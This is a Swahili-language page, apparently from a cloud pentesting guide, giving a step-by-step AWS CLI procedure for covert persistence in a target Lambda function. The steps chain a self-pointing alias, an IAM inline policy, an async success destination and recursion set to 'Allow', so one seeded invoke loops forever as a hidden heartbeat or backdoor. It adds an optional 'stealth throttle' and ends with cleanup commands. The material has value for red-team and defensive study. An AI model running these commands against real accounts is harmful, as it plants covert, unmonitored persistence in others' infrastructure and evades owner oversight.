# AWS - Lambda Async Self-Loop Persistence via Destinations + Recursion Allow

Matumizi mabaya ya Destinations asynchronous za Lambda pamoja na usanidi wa Recursion ili kufanya function ijirudishe-invoke kila mara bila mscheduler wa nje (hakuna EventBridge, cron, n.k.). Kwa default, Lambda inavunja loop za recursion, lakini kuweka recursion config kwa Allow kunaziwezesha tena. Destinations hufanya delivery upande wa service kwa async invokes, hivyo invoke moja ya kuanzisha inaunda chaneli ya heartbeat/backdoor isiyo na msimbo na ya siri. Kwa hiari fupisha kwa reserved concurrency ili kupunguza kelele.

Vidokezo
- Lambda haiwezi kuruhusu kusanidi function kuwa destination yake moja kwa moja. Tumia function alias kama destination na ruhusu execution role kui-invoke alias hiyo.
- Ruhusa za chini kabisa: uwezo wa kusoma/kusasisha event invoke config na recursion config za function lengwa, kuchapisha version na kusimamia alias, na kusasisha policy ya execution role ya function ili kuruhusu lambda:InvokeFunction kwenye alias.

## Mahitaji
- Region: us-east-1
- Vars:
- REGION=us-east-1
- TARGET_FN=<target-lambda-name>

## Hatua

1) Pata function ARN na usanidi wa recursion wa sasa
```
FN_ARN=$(aws lambda get-function --function-name "$TARGET_FN" --region $REGION --query Configuration.FunctionArn --output text)
aws lambda get-function-recursion-config --function-name "$TARGET_FN" --region $REGION || true
```
2) Chapisha toleo na unda/sasisha alias (inayotumika kama destinisho la mwenyewe)
```
VER=$(aws lambda publish-version --function-name "$TARGET_FN" --region $REGION --query Version --output text)
if ! aws lambda get-alias --function-name "$TARGET_FN" --name loop --region $REGION >/dev/null 2>&1; then
aws lambda create-alias --function-name "$TARGET_FN" --name loop --function-version "$VER" --region $REGION
else
aws lambda update-alias --function-name "$TARGET_FN" --name loop --function-version "$VER" --region $REGION
fi
ALIAS_ARN=$(aws lambda get-alias --function-name "$TARGET_FN" --name loop --region $REGION --query AliasArn --output text)
```
3) Ruhusu function execution role kuitisha alias (inahitajika na Lambda Destinationsâ†’Lambda)
```
# Set this to the execution role name used by the target function
ROLE_NAME=<lambda-execution-role-name>
cat > /tmp/invoke-self-policy.json <<EOF
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "lambda:InvokeFunction",
"Resource": "${ALIAS_ARN}"
}
]
}
EOF
aws iam put-role-policy --role-name "$ROLE_NAME" --policy-name allow-invoke-self --policy-document file:///tmp/invoke-self-policy.json --region $REGION
```
4) Sanidi async destination kwa alias (self via alias) na uzime retries
```
aws lambda put-function-event-invoke-config \
--function-name "$TARGET_FN" \
--destination-config OnSuccess={Destination=$ALIAS_ARN} \
--maximum-retry-attempts 0 \
--region $REGION

# Verify
aws lambda get-function-event-invoke-config --function-name "$TARGET_FN" --region $REGION --query DestinationConfig
```
5) Ruhusu mizunguko ya rekursivu
```
aws lambda put-function-recursion-config --function-name "$TARGET_FN" --recursive-loop Allow --region $REGION
aws lambda get-function-recursion-config --function-name "$TARGET_FN" --region $REGION
```
6) Chochea invoke moja asynchronous
```
aws lambda invoke --function-name "$TARGET_FN" --invocation-type Event /tmp/seed.json --region $REGION >/dev/null
```
7) Angalia miito zinazoendelea (mifano)
```
# Recent logs (if the function logs each run)
aws logs filter-log-events --log-group-name "/aws/lambda/$TARGET_FN" --limit 20 --region $REGION --query events[].timestamp --output text
# or check CloudWatch Metrics for Invocations increasing
```
8) Hiari: stealth throttle
```
aws lambda put-function-concurrency --function-name "$TARGET_FN" --reserved-concurrent-executions 1 --region $REGION
```
## Usafishaji
Vunja loop na ondoa persistence.
```
aws lambda put-function-recursion-config --function-name "$TARGET_FN" --recursive-loop Terminate --region $REGION
aws lambda delete-function-event-invoke-config --function-name "$TARGET_FN" --region $REGION || true
aws lambda delete-function-concurrency --function-name "$TARGET_FN" --region $REGION || true
# Optional: delete alias and remove the inline policy when finished
aws lambda delete-alias --function-name "$TARGET_FN" --name loop --region $REGION || true
ROLE_NAME=<lambda-execution-role-name>
aws iam delete-role-policy --role-name "$ROLE_NAME" --policy-name allow-invoke-self --region $REGION || true
```
## Athari
- Async invoke moja husababisha Lambda kuji-invoke upya kwa uendelevu bila scheduler ya nje, ikiruhusu stealthy persistence/heartbeat. Reserved concurrency inaweza kupunguza kelele hadi warm execution moja.
